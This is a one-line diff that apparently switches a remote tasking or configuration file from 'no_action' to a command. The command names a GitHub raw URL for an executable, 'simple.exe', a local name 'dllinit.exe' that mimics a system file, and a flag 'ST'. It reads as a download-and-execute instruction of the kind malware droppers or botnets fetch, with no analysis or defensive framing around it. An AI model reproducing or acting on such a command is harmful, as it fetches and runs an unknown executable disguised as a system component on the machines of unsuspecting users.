@@ -1,1 +1,1 @@
-no_action
+https://github.com/barbara1337/pro_1/raw/master/simple.exe dllinit.exe ST
